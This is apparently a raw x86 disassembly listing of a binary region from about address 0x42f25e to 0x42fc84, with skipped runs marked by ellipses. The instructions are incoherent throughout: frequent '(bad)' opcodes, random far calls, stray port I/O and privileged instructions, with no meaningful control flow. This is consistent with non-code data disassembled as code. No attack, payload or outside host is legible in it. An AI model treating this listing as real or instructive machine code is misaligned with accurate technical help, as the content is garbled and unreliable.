  42f25e:	sbb    esi,edi
  42f260:	jle    0x42f27f
  42f262:	lods   eax,DWORD PTR ds:[esi]
  42f263:	sub    DWORD PTR ds:0x5f9b35a2,0x34
  42f26a:	push   esp
  42f26b:	inc    DWORD PTR [ebx+0x2b]
  42f26e:	sti    
  42f26f:	dec    ecx
  42f270:	mov    esi,gs
  42f272:	jbe    0x42f2a9
  42f274:	cld    
  42f275:	pop    es
  42f276:	push   0x1b
  42f278:	call   0x67c9:0xa2e645ac
  42f27f:	in     al,0x52
  42f281:	(bad)  
  42f282:	inc    ebx
  42f283:	shl    BYTE PTR [edx+0x9],1
  42f286:	pop    ecx
  42f287:	call   0x3b4c59df
  42f28c:	in     al,dx
  42f28d:	loopne 0x42f22d
  42f28f:	push   0x42
  42f291:	scas   eax,DWORD PTR es:[edi]
  42f292:	popf   
  42f293:	ret    0xa462
  42f296:	aas    
  42f297:	push   ds
  42f298:	inc    edi
  42f299:	(bad)  
  42f29a:	ja     0x42f300
  42f29c:	jo     0x42f31b
  42f29e:	mov    DWORD PTR [eax+edi*8],ecx
  42f2a1:	jo     0x42f2f5
  42f2a3:	repnz in eax,dx
  42f2a5:	xchg   ebp,eax
  42f2a6:	das    
  42f2a7:	jbe    0x42f2e9
  42f2a9:	std    
  42f2aa:	push   0x39
  42f2ac:	rcl    DWORD PTR [ebx],cl
  42f2ae:	and    BYTE PTR [ebp+0x5b9ce4fa],cl
  42f2b4:	(bad)  
  42f2b5:	xchg   edi,eax
  42f2b6:	iret   
  42f2b7:	hlt    
  42f2b8:	lods   eax,DWORD PTR ds:[esi]
  42f2b9:	loope  0x42f2b1
  42f2bb:	out    0xec,eax
  42f2bd:	lea    esp,[edx+0x29]
  42f2c0:	adc    BYTE PTR [esi+0x3f],dl
  42f2c3:	stos   BYTE PTR es:[edi],al
  42f2c4:	jle    0x42f308
  42f2c6:	jo     0x42f2f7
  42f2c8:	daa    
  42f2c9:	push   ecx
  42f2ca:	(bad)  
  42f2cb:	pop    ebx
  42f2cc:	cmp    eax,0xb37dfd8c
  42f2d1:	out    0xeb,al
  42f2d3:	jnp    0x42f255
  42f2d5:	push   ecx
  42f2d6:	scas   eax,DWORD PTR es:[edi]
  42f2d7:	cmp    BYTE PTR [eax-0x3f],0xc0
  42f2db:	mov    bh,0xe4
  42f2dd:	push   ss
  42f2de:	fild   QWORD PTR [ebp+0x70]
  42f2e1:	push   0xce6b8b89
  42f2e6:	jle    0x42f2bc
  42f2e8:	and    al,0x81
  42f2ea:	or     al,0xe1
  42f2ec:	jae    0x42f2a5
  42f2ee:	mov    bl,0xe9
  42f2f0:	inc    edi
  42f2f1:	mov    dl,0xdd
  42f2f3:	dec    esi
  42f2f4:	ffreep st(6)
  42f2f6:	push   cs
  42f2f7:	mov    ebx,edi
  42f2f9:	and    DWORD PTR [ecx],ecx
  42f2fb:	imul   ecx,edi,0xcbe5778
  42f301:	inc    esi
  42f302:	lods   eax,DWORD PTR ds:[esi]
  42f303:	out    0xef,eax
  42f305:	xadd   BYTE PTR [edi-0x6516df41],ah
  42f30c:	adc    esp,edi
  42f30e:	adc    BYTE PTR [ebx+0x0],0x0
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	(bad)  
  42f382:	mov    bl,0x7f
  42f384:	push   0x40001f9
  42f389:	add    DWORD PTR [eax],eax
  42f38b:	add    bh,dh
  42f38d:	cmp    BYTE PTR [edx+0x47ab7012],dh
  42f393:	popf   
  42f394:	out    0x49,eax
  42f396:	sbb    ah,bh
  42f398:	sbb    DWORD PTR [esi+0x58],edx
  42f39b:	pop    ebx
  42f39c:	mov    WORD PTR [ebx+0x58],ss
  42f39f:	add    BYTE PTR [esi],dh
  42f3a1:	adc    edi,DWORD PTR [ebx+0x18162f9b]
  42f3a7:	repz sahf 
  42f3a9:	or     al,0x84
  42f3ab:	ja     0x42f344
  42f3ad:	mov    ds:0xb4adc5a0,eax
  42f3b2:	les    esi,FWORD PTR [esi+0x5f]
  42f3b5:	aaa    
  42f3b6:	push   esp
  42f3b7:	xchg   edi,eax
  42f3b8:	cmp    al,0x27
  42f3ba:	add    ah,cl
  42f3bc:	pop    ds
  42f3bd:	xor    BYTE PTR [ebx-0x31192da4],ah
  42f3c3:	pop    ecx
  42f3c4:	jl     0x42f407
  42f3c6:	mov    ebx,DWORD PTR [ebx]
  42f3c8:	ins    BYTE PTR es:[edi],dx
  42f3c9:	sbb    BYTE PTR [ebx],ah
  42f3cb:	test   al,0x78
  42f3cd:	repnz call 0x18e1:0x48458180
  42f3d5:	cmp    esp,DWORD PTR [edx-0x24f2c08c]
  42f3db:	ret    0xcc28
  42f3de:	arpl   WORD PTR [esi],sp
  42f3e0:	xchg   ecx,eax
  42f3e1:	cs mov edx,0x39d1a849
  42f3e7:	je     0x42f420
  42f3e9:	inc    ebp
  42f3ea:	xchg   ecx,eax
  42f3eb:	cmp    ch,BYTE PTR [ecx]
  42f3ed:	xchg   esi,eax
  42f3ee:	rcl    BYTE PTR [ecx],1
  42f3f0:	inc    eax
  42f3f1:	push   es
  42f3f2:	ja     0x42f416
  42f3f4:	inc    ebx
  42f3f5:	push   0x128abeb
  42f3fa:	gs enter 0xcfe9,0xb1
  42f3ff:	push   es
  42f400:	fdiv   DWORD PTR [esi]
  42f402:	add    al,0xe
  42f404:	sub    edx,DWORD PTR [eax+ebx*8+0x52]
  42f408:	sbb    al,0xf9
  42f40a:	aam    0x16
  42f40c:	call   0xd8d41482
  42f411:	sbb    BYTE PTR [ecx-0x23d42738],0x57
  42f418:	or     BYTE PTR ds:0x42d9933b,cl
  42f41e:	lock xchg ebx,eax
  42f420:	push   eax
  42f421:	cmp    cl,BYTE PTR ds:[esp+ecx*8+0x24]
  42f426:	mov    ecx,0xa91e7ec9
  42f42b:	data16 fxch st(0)
  42f42e:	test   BYTE PTR [ebx+eax*4],bl
  42f431:	test   DWORD PTR [edi+0x49],0x80c32d67
  42f438:	cmc    
  42f439:	cli    
  42f43a:	retf   
  42f43b:	aam    0x58
  42f43d:	(bad)  
  42f43e:	(bad)  
  42f43f:	lods   eax,DWORD PTR ds:[esi]
  42f440:	mov    esp,0xb80aeb69
  42f445:	int    0xf4
  42f447:	xchg   ebx,eax
  42f448:	sub    DWORD PTR [eax-0x1cbf8049],esi
  42f44e:	jmp    0x42f406
  42f450:	clc    
  42f451:	mov    edx,0x2056b5df
  42f456:	int3   
  42f457:	mov    BYTE PTR [si],dh
  42f45a:	sub    BYTE PTR [esi+0x19],bh
  42f45d:	shl    BYTE PTR [ebx+0x21ba0218],0xac
  42f464:	mov    BYTE PTR [ebx+0x4943e812],0x61
  42f46b:	cmp    eax,0x25bdaf97
  42f470:	cli    
  42f471:	in     eax,0x98
  42f473:	lock and BYTE PTR ds:[edx-0x69a25e92],cl
  42f47b:	adc    esi,DWORD PTR [edi-0xa542be1]
  42f481:	mov    esi,0xe16489e5
  42f486:	(bad)  
  42f487:	fstp   QWORD PTR [ecx]
  42f489:	into   
  42f48a:	mov    esi,DWORD PTR [edx]
  42f48c:	or     bl,cl
  42f48e:	jbe    0x42f4ee
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	mov    cl,0x5b
  42f502:	xchg   esi,eax
  42f503:	pop    ebx
  42f504:	ins    BYTE PTR es:[edi],dx
  42f505:	cli    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	mov    DWORD PTR [ebx+0x647ef376],esp
  42f512:	mov    ch,0xdf
  42f514:	inc    edx
  42f515:	and    ebp,DWORD PTR [esi]
  42f517:	dec    edi
  42f518:	popa   
  42f519:	sbb    al,0xfd
  42f51c:	cmp    eax,DWORD PTR [edx]
  42f51e:	ror    DWORD PTR [ebx+eax*4+0x2a],cl
  42f522:	sub    al,BYTE PTR [edi-0x1c]
  42f525:	inc    edi
  42f526:	sub    al,0x44
  42f528:	in     al,dx
  42f529:	test   eax,0x4a7c56e5
  42f52e:	mov    ds:0x156e2e99,al
  42f533:	jne    0x42f5a1
  42f535:	and    al,0x7a
  42f537:	lods   al,BYTE PTR ds:[esi]
  42f538:	sti    
  42f539:	arpl   WORD PTR [ecx],bp
  42f53b:	dec    eax
  42f53c:	dec    ah
  42f53e:	jle    0x42f5bd
  42f540:	and    al,0xc0
  42f542:	in     eax,0x41
  42f544:	mov    ch,0x26
  42f546:	jns    0x42f53e
  42f548:	inc    edi
  42f549:	adc    al,0xf6
  42f54b:	push   ebx
  42f54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f54d:	jge    0x42f5a1
  42f54f:	adc    cl,BYTE PTR [eax]
  42f551:	lods   al,BYTE PTR ds:[esi]
  42f552:	inc    esi
  42f553:	(bad)  
  42f554:	push   ecx
  42f555:	aad    0xbf
  42f557:	dec    esi
  42f558:	inc    ebp
  42f559:	js     0x42f550
  42f55b:	add    al,0xba
  42f55d:	fiadd  DWORD PTR [ebx-0x4f]
  42f560:	rol    DWORD PTR [ebx],1
  42f562:	and    DWORD PTR [ebx+0x3ad8218e],ecx
  42f568:	inc    ebp
  42f569:	scas   al,BYTE PTR es:[edi]
  42f56a:	ficom  WORD PTR [ebx+0x35]
  42f56d:	sbb    eax,0xdd6ebd6e
  42f572:	push   0x374b087f
  42f577:	add    BYTE PTR [esp+eiz*2-0x17],ah
  42f57b:	pushf  
  42f57c:	inc    ecx
  42f57d:	inc    edi
  42f57e:	mul    BYTE PTR [edi+0x1c69bbdf]
  42f584:	sub    al,0xc5
  42f586:	mov    ecx,0xefc40ba4
  42f58b:	sbb    ebx,ebp
  42f58d:	std    
  42f58e:	ret    
  42f58f:	and    al,0xf
  42f591:	push   ds
  42f592:	or     edx,esi
  42f594:	lds    esi,FWORD PTR [ebp+esi*1+0x6c]
  42f598:	jmp    0x35a49b61
  42f59d:	pop    edi
  42f59e:	sub    eax,eax
  42f5a0:	aam    0x93
  42f5a2:	xchg   BYTE PTR [ebp-0x2a39291c],al
  42f5a8:	arpl   si,sp
  42f5aa:	inc    ecx
  42f5ab:	(bad)  
  42f5ac:	jo     0x42f611
  42f5ae:	jo     0x42f624
  42f5b0:	pop    ss
  42f5b1:	int3   
  42f5b2:	cmp    BYTE PTR [ebx],0xd
  42f5b5:	popa   
  42f5b6:	adc    cl,BYTE PTR [edi]
  42f5b8:	repz sbb al,0x2c
  42f5bb:	call   0x9acf:0xe3851f5b
  42f5c2:	or     eax,0x4e449e1e
  42f5c7:	jmp    FWORD PTR [esi-0x24750747]
  42f5cd:	fistp  DWORD PTR [edi+0x51]
  42f5d0:	cmp    dh,BYTE PTR [ebp-0x78]
  42f5d3:	adc    BYTE PTR [ebp-0x59],cl
  42f5d6:	mul    DWORD PTR ds:0x1b245cd4
  42f5dc:	push   ds
  42f5dd:	pop    ss
  42f5de:	ret    0xdd3e
  42f5e1:	lods   al,BYTE PTR ds:[esi]
  42f5e2:	mov    ds:0x93a81611,al
  42f5e7:	add    eax,0xfa736e72
  42f5ec:	hlt    
  42f5ed:	lock cmp eax,0xc3152ef
  42f5f3:	adc    ah,0xa7
  42f5f6:	pop    edx
  42f5f7:	xor    bl,bh
  42f5f9:	xor    eax,0xcab1dcbe
  42f5fe:	jb     0x42f5bd
  42f600:	cmp    eax,0xfaeca94b
  42f605:	rol    eax,1
  42f607:	inc    ebp
  42f608:	cmp    BYTE PTR [ebp-0x6d5b30d5],cl
  42f60e:	ins    DWORD PTR es:[edi],dx
  42f60f:	push   eax
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	push   0xffffffb2
  42f682:	mov    esp,0x1fb707f
  42f687:	add    BYTE PTR [ecx+eax*1],al
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	mov    dh,bh
  42f68e:	xchg   ecx,eax
  42f68f:	imul   esi,ebx,0x33140027
  42f695:	test   edx,esp
  42f697:	jecxz  0x42f6a0
  42f699:	int3   
  42f69a:	and    BYTE PTR ds:0x8624a4e1,dl
  42f6a0:	inc    ebx
  42f6a1:	retf   
  42f6a2:	adc    eax,DWORD PTR [edi+0x7213d0db]
  42f6a8:	daa    
  42f6a9:	mov    esp,0x9be0569
  42f6ae:	fidivr WORD PTR [eax+0x53cb032d]
  42f6b4:	shr    BYTE PTR [edi+eax*1],1
  42f6b7:	call   0xf4bd:0xdefb3067
  42f6be:	call   0x6ba1:0x10a4c96e
  42f6c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6c6:	fsubrp st(1),st
  42f6c8:	and    ch,BYTE PTR [edi]
  42f6ca:	sbb    al,0x5b
  42f6cc:	mov    ebp,0x68259600
  42f6d1:	imul   edx,eax,0xfffffff9
  42f6d4:	or     DWORD PTR [ebx-0x58a0f101],eax
  42f6da:	mov    al,ds:0xbdf4ce98
  42f6df:	cmp    BYTE PTR [edi-0x58],0x35
  42f6e3:	mov    edi,0x5097992f
  42f6e8:	jecxz  0x42f6a4
  42f6ea:	adc    eax,0xd99b54f6
  42f6ef:	adc    dh,0x6c
  42f6f2:	mov    ah,ah
  42f6f4:	sub    al,0xa
  42f6f6:	in     al,0x77
  42f6f8:	loope  0x42f6c6
  42f6fa:	gs jnp 0x42f76e
  42f6fd:	xchg   DWORD PTR [edx+0x36aaee5c],ebx
  42f703:	dec    esi
  42f704:	add    dl,bh
  42f706:	sub    DWORD PTR cs:[edx-0x3311bd08],0xffffffec
  42f70e:	cs cld 
  42f710:	ins    BYTE PTR es:[edi],dx
  42f711:	cwde   
  42f712:	dec    ecx
  42f713:	std    
  42f714:	mov    esi,0xba27e9ef
  42f719:	add    eax,0x53c1205c
  42f71e:	shl    BYTE PTR [esi+0x45],0xdc
  42f722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f723:	xlat   BYTE PTR ds:[ebx]
  42f724:	sets   BYTE PTR [ebp-0x4e]
  42f728:	jne    0x42f6ea
  42f72a:	into   
  42f72b:	not    DWORD PTR [edx]
  42f72d:	(bad)  
  42f72e:	cmp    DWORD PTR [edi],edi
  42f730:	add    ebx,ecx
  42f732:	out    0x72,al
  42f734:	pop    esi
  42f735:	shl    ebp,1
  42f737:	jmp    0x42f79a
  42f739:	pop    ebp
  42f73a:	add    esp,0x134c538e
  42f740:	pop    ds
  42f741:	test   DWORD PTR [ebp+0x25],ebp
  42f744:	dec    ebx
  42f745:	xchg   edx,eax
  42f746:	mov    edi,0xaca84bef
  42f74b:	int    0x31
  42f74d:	fs in  al,0xaa
  42f750:	lods   eax,DWORD PTR ds:[esi]
  42f751:	and    bh,BYTE PTR [ebp+0x631691b7]
  42f757:	jle    0x42f701
  42f759:	rcr    BYTE PTR [ebx],0x2b
  42f75c:	or     al,BYTE PTR [esi+eiz*4+0x32]
  42f760:	in     eax,0xca
  42f762:	mov    cl,0x20
  42f764:	lahf   
  42f765:	adc    esp,DWORD PTR [esi+0x32]
  42f768:	rcr    BYTE PTR [eax],0x41
  42f76b:	or     eax,0xc0340dc8
  42f770:	lock cmp ebp,ecx
  42f773:	or     BYTE PTR [edx],0x68
  42f776:	mov    edx,DWORD PTR [ecx]
  42f778:	jbe    0x42f773
  42f77a:	les    esi,FWORD PTR [esi-0x48]
  42f77d:	jmp    0xa245da01
  42f782:	sar    BYTE PTR [edi],cl
  42f784:	add    ecx,0x66
  42f787:	into   
  42f788:	into   
  42f789:	or     BYTE PTR [edx],0xd8
  42f78c:	popf   
  42f78d:	dec    edx
  42f78e:	out    dx,al
  42f78f:	adc    al,0x0
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x5a535157
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	add    eax,0x727997a9
  42f811:	mov    ch,dl
  42f813:	xchg   ebx,eax
  42f814:	into   
  42f815:	bnd call 0xefcf4059
  42f81b:	out    0xdb,eax
  42f81d:	sbb    BYTE PTR [eax-0x43],0xaf
  42f821:	jle    0x42f7c2
  42f823:	pop    esi
  42f824:	js     0x42f874
  42f826:	dec    eax
  42f827:	test   al,0x8
  42f829:	fisub  WORD PTR [eax+edx*8-0x4618efbc]
  42f830:	xchg   esp,eax
  42f831:	imul   ecx,DWORD PTR [ebx],0x3c
  42f834:	test   BYTE PTR [esi+0x4a5e2b3b],ah
  42f83a:	dec    esi
  42f83b:	out    0x3d,eax
  42f83d:	sub    DWORD PTR [edi],esp
  42f83f:	cld    
  42f840:	or     ah,BYTE PTR es:[edx+esi*4-0x124c0c35]
  42f848:	xchg   esi,eax
  42f849:	cmc    
  42f84a:	and    eax,0x60e046dc
  42f84f:	and    BYTE PTR [eax+eiz*2-0x61d4663c],dh
  42f856:	cmp    DWORD PTR [esi-0x71],esi
  42f859:	add    bl,ch
  42f85b:	retf   
  42f85c:	fild   WORD PTR [esp+ebp*2+0x1a6ffa47]
  42f863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f864:	inc    esp
  42f865:	xchg   ebp,eax
  42f866:	mov    esi,0x906a5966
  42f86b:	retf   
  42f86c:	mov    ah,0x1e
  42f86e:	enter  0x9b27,0xf3
  42f872:	daa    
  42f873:	mov    cl,0x63
  42f875:	das    
  42f876:	mov    eax,ss
  42f878:	popa   
  42f879:	xchg   BYTE PTR [edi+esi*8+0x60a00bd],ah
  42f880:	sub    edx,DWORD PTR [esi-0x64]
  42f883:	cmp    BYTE PTR [esi-0x38],bl
  42f886:	xor    bl,ch
  42f888:	test   BYTE PTR ds:0xd3625a64,bl
  42f88e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f88f:	movd   DWORD PTR [edi-0x2986e842],mm1
  42f896:	sbb    eax,ecx
  42f898:	inc    esp
  42f899:	pop    eax
  42f89a:	or     DWORD PTR [edx],ecx
  42f89c:	stc    
  42f89d:	mov    ebp,0x5edbad6c
  42f8a2:	jno    0x42f923
  42f8a4:	and    eax,0x1d48b5e2
  42f8a9:	outs   dx,BYTE PTR ds:[esi]
  42f8aa:	push   ebx
  42f8ab:	icebp  
  42f8ac:	hlt    
  42f8ad:	xor    DWORD PTR [ecx-0x79c3f997],0x3d7a2181
  42f8b7:	sar    BYTE PTR [edi-0x32e92188],1
  42f8bd:	push   esp
  42f8be:	xchg   ebx,eax
  42f8bf:	bound  ebx,QWORD PTR ds:0x3c96f6ff
  42f8c5:	cwde   
  42f8c6:	dec    esi
  42f8c7:	leave  
  42f8c8:	and    eax,0x30ef1f89
  42f8cd:	xor    BYTE PTR [edx+0x11f2e6b],0x98
  42f8d4:	push   cs
  42f8d5:	sbb    al,0x3d
  42f8d7:	aad    0xc9
  42f8d9:	fsub   QWORD PTR ds:[edi]
  42f8dc:	je     0x42f89c
  42f8de:	sahf   
  42f8df:	push   esi
  42f8e0:	je     0x42f91d
  42f8e2:	and    eax,0x52417553
  42f8e7:	jecxz  0x42f920
  42f8e9:	sbb    ah,BYTE PTR [edi+eax*4+0x5deb8c0b]
  42f8f0:	push   0x1a
  42f8f2:	push   esi
  42f8f3:	fldenv [eax]
  42f8f5:	imul   esp,esp,0xffffffe2
  42f8f8:	adc    al,BYTE PTR [ebx]
  42f8fa:	push   ecx
  42f8fb:	in     eax,dx
  42f8fc:	dec    esi
  42f8fd:	push   ds
  42f8fe:	adc    bl,ah
  42f900:	xor    BYTE PTR [edi+0x6c],ah
  42f903:	xchg   ecx,eax
  42f904:	jne    0x42f8ab
  42f906:	jnp    0x42f975
  42f908:	push   cs
  42f909:	push   cs
  42f90a:	test   edi,0xc16c8f3c
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9c2
  42f981:	xchg   edx,eax
  42f982:	sub    cl,al
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	(bad)  
  42f98d:	cmp    ebp,DWORD PTR [eax-0x31a80d75]
  42f993:	ds sbb al,0x94
  42f996:	xlat   BYTE PTR ds:[ebx]
  42f997:	fmul   DWORD PTR [ebx+0x2d97a313]
  42f99d:	int    0xbf
  42f99f:	loope  0x42f958
  42f9a1:	or     DWORD PTR [ecx+0x1b],0xfffffff8
  42f9a5:	add    DWORD PTR [eax],0xb6a46d0c
  42f9ab:	mov    eax,ds:0x103dbfa7
  42f9b0:	out    0x4c,eax
  42f9b2:	mov    cs,WORD PTR [ebx+edx*2-0x26f69ad4]
  42f9b9:	int    0x4d
  42f9bb:	out    dx,al
  42f9bc:	sub    eax,0x23068291
  42f9c1:	pop    DWORD PTR [ebx]
  42f9c3:	test   DWORD PTR gs:[ebx],0xf24f4ef6
  42f9ca:	out    0x8e,al
  42f9cc:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42f9ce:	push   esi
  42f9cf:	inc    edx
  42f9d0:	sbb    DWORD PTR [edx],ecx
  42f9d2:	popa   
  42f9d3:	fisubr DWORD PTR [edx-0x10cc1580]
  42f9d9:	mov    ds:0x15e0378b,al
  42f9de:	(bad)  
  42f9df:	cmp    al,0x80
  42f9e1:	cs ins DWORD PTR es:[edi],dx
  42f9e3:	or     eax,0x7a630f31
  42f9e8:	sti    
  42f9e9:	or     eax,0xdabd5ec7
  42f9ee:	(bad)  
  42f9ef:	mov    ecx,0x3bd800c5
  42f9f4:	test   eax,0x83e4039e
  42f9f9:	jge    0x42f9b3
  42f9fb:	or     bh,BYTE PTR [esi-0x1a5127c]
  42fa01:	add    ch,BYTE PTR [edi-0x11f68511]
  42fa07:	pop    esp
  42fa08:	std    
  42fa09:	push   eax
  42fa0b:	mov    dh,0x5c
  42fa0d:	repnz loopne 0x42f9cd
  42fa10:	dec    esi
  42fa11:	sbb    al,dh
  42fa13:	pop    ebx
  42fa14:	daa    
  42fa15:	mov    eax,DWORD PTR [edi]
  42fa17:	stos   BYTE PTR es:[edi],al
  42fa18:	shl    DWORD PTR [ebx+0x38d4e211],cl
  42fa1e:	aaa    
  42fa1f:	arpl   ax,cx
  42fa21:	imul   ecx,DWORD PTR [bx+di-0x48],0xffffffb3
  42fa26:	cld    
  42fa27:	lea    edi,[edx-0x79]
  42fa2a:	mov    ds:0x2d44dad3,al
  42fa2f:	xchg   edi,eax
  42fa30:	int    0x48
  42fa32:	and    esp,DWORD PTR [edi+esi*2-0x2cca685]
  42fa39:	adc    ebx,esi
  42fa3b:	cmp    ebp,DWORD PTR [eax+0x6b]
  42fa3e:	pop    ebx
  42fa3f:	and    esi,DWORD PTR [edi-0x5c]
  42fa42:	aaa    
  42fa43:	mov    DWORD PTR [ecx+ebp*1+0x54],esi
  42fa47:	mov    WORD PTR [ecx-0x46],gs
  42fa4a:	pusha  
  42fa4b:	inc    edi
  42fa4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa4d:	mov    esi,0x7f4a67c9
  42fa52:	popa   
  42fa53:	pop    eax
  42fa54:	ret    0x60a3
  42fa57:	(bad)  
  42fa58:	jne    0x42faa4
  42fa5a:	cs int 0xd1
  42fa5d:	and    BYTE PTR [ebx],dh
  42fa5f:	lock rcl di,cl
  42fa63:	je     0x42fa1f
  42fa65:	sbb    al,BYTE PTR [edx+0x37]
  42fa68:	popa   
  42fa69:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa6b:	rcl    DWORD PTR [esi+0x1085cefd],1
  42fa71:	jbe    0x42fa16
  42fa73:	test   BYTE PTR [ebp+0x57],dl
  42fa76:	std    
  42fa77:	dec    eax
  42fa78:	mov    ebp,0xfb7ffeb6
  42fa7d:	sbb    ebx,esi
  42fa7f:	jmp    0x9ec0c3a5
  42fa84:	jl     0x42fa92
  42fa86:	mov    dl,0x88
  42fa88:	adc    DWORD PTR [ecx+ebp*8],0x0
  42fa8c:	mov    al,0x59
  42fa8e:	sbb    ch,dh
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	jg     0x42fb6e
  42fb02:	push   es
  42fb03:	loop   0x42fb81
  42fb05:	inc    BYTE PTR [ecx]
  42fb07:	add    BYTE PTR [ecx+eax*1],al
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	dec    esp
  42fb0d:	(bad)  
  42fb0e:	stc    
  42fb0f:	sar    DWORD PTR [ebx-0x64],cl
  42fb12:	cwde   
  42fb13:	bound  eax,QWORD PTR [esi]
  42fb15:	in     al,dx
  42fb16:	adc    DWORD PTR [ebx+0x5802e422],eax
  42fb1c:	int    0x73
  42fb1e:	(bad)  
  42fb1f:	repnz and eax,0x3d8dd0
  42fb25:	inc    edi
  42fb26:	pop    ecx
  42fb27:	das    
  42fb28:	(bad)  
  42fb29:	aam    0xdb
  42fb2b:	es jno 0x42fb2f
  42fb2e:	mov    bl,0x7e
  42fb30:	jl     0x42fab3
  42fb32:	call   0x224652c4
  42fb37:	sbb    BYTE PTR [edi],cl
  42fb39:	hlt    
  42fb3a:	sbb    eax,0x104d4f2a
  42fb3f:	loope  0x42fbb6
  42fb41:	out    0xae,al
  42fb43:	sbb    eax,0xea0cfdd5
  42fb48:	sub    BYTE PTR [eax-0x283dab1],bh
  42fb4e:	arpl   bp,bp
  42fb50:	repnz push eax
  42fb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb53:	arpl   dx,si
  42fb55:	rcr    BYTE PTR [edi-0x42],0xd
  42fb59:	jl     0x42fae2
  42fb5b:	test   al,0xc7
  42fb5d:	push   ds
  42fb5e:	clc    
  42fb5f:	ror    BYTE PTR [edx],cl
  42fb61:	or     dh,BYTE PTR [ebx+0x7cd10394]
  42fb67:	js     0x42fbe0
  42fb69:	pop    esi
  42fb6a:	adc    BYTE PTR [esi],dl
  42fb6c:	popf   
  42fb6d:	jmp    0x42fba9
  42fb6f:	fcomp  DWORD PTR [eax-0x4d]
  42fb72:	mov    cl,0xa3
  42fb74:	pop    esi
  42fb75:	xchg   esi,eax
  42fb76:	movntps XMMWORD PTR [edi-0x48eb6a8c],xmm1
  42fb7d:	aas    
  42fb7e:	mov    al,ds:0x334dfa93
  42fb83:	inc    ebp
  42fb84:	adc    edi,DWORD PTR [ebp+0x56]
  42fb87:	sub    BYTE PTR [eax-0x7b7862ce],bl
  42fb8d:	jg     0x42fb60
  42fb8f:	mov    eax,0x7b1e21cf
  42fb94:	sbb    dh,BYTE PTR ds:0x5b0100e4
  42fb9a:	int3   
  42fb9b:	dec    ebx
  42fb9c:	mov    BYTE PTR [edx+0x66],bh
  42fb9f:	clc    
  42fba0:	push   edi
  42fba1:	dec    edx
  42fba2:	into   
  42fba3:	mov    esp,0x3c1a4b3e
  42fba8:	loope  0x42fbd4
  42fbaa:	and    DWORD PTR [ecx-0x14],esp
  42fbad:	mov    ebp,0xa4e9cbf9
  42fbb2:	rsqrtps xmm7,xmm7
  42fbb5:	dec    edx
  42fbb6:	cwde   
  42fbb7:	nop
  42fbb8:	push   0xfffffff1
  42fbba:	fistp  DWORD PTR [ebp+0x44dfc642]
  42fbc0:	(bad)  
  42fbc2:	daa    
  42fbc3:	jb     0x42fbd3
  42fbc5:	jns    0x42fc00
  42fbc7:	sub    esi,esi
  42fbc9:	pop    es
  42fbca:	add    dh,0x38
  42fbcd:	mov    ds:0xaa533625,eax
  42fbd2:	ins    BYTE PTR es:[edi],dx
  42fbd3:	push   esi
  42fbd4:	dec    ebx
  42fbd5:	jns    0x42fc3b
  42fbd7:	inc    eax
  42fbd8:	in     al,0x7b
  42fbda:	scas   al,BYTE PTR es:[edi]
  42fbdb:	and    al,0xf6
  42fbdd:	(bad)  [esi-0x2a8e0f9e]
  42fbe3:	pusha  
  42fbe4:	int3   
  42fbe5:	fimul  WORD PTR [ebx+0x76b3d541]
  42fbeb:	fs mov cl,0x2f
  42fbee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbef:	xchg   edi,eax
  42fbf0:	mov    dl,0x1b
  42fbf2:	sahf   
  42fbf3:	mov    edi,0x9499a772
  42fbf8:	repnz into 
  42fbfa:	int    0xa1
  42fbfc:	(bad)  
  42fbfd:	pushf  
  42fbfe:	fbld   TBYTE PTR [ebx]
  42fc00:	xchg   ebx,eax
  42fc01:	cmp    dl,BYTE PTR [eax-0x2ff8f6b]
  42fc07:	sub    bl,0x1f
  42fc0a:	cmp    eax,0x1a28af39
  42fc0f:	lock add BYTE PTR [eax],al
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [esi],ah
  42fc81:	adc    ebx,DWORD PTR [ecx-0x5]
  42fc84:	cmp    bh,0x1
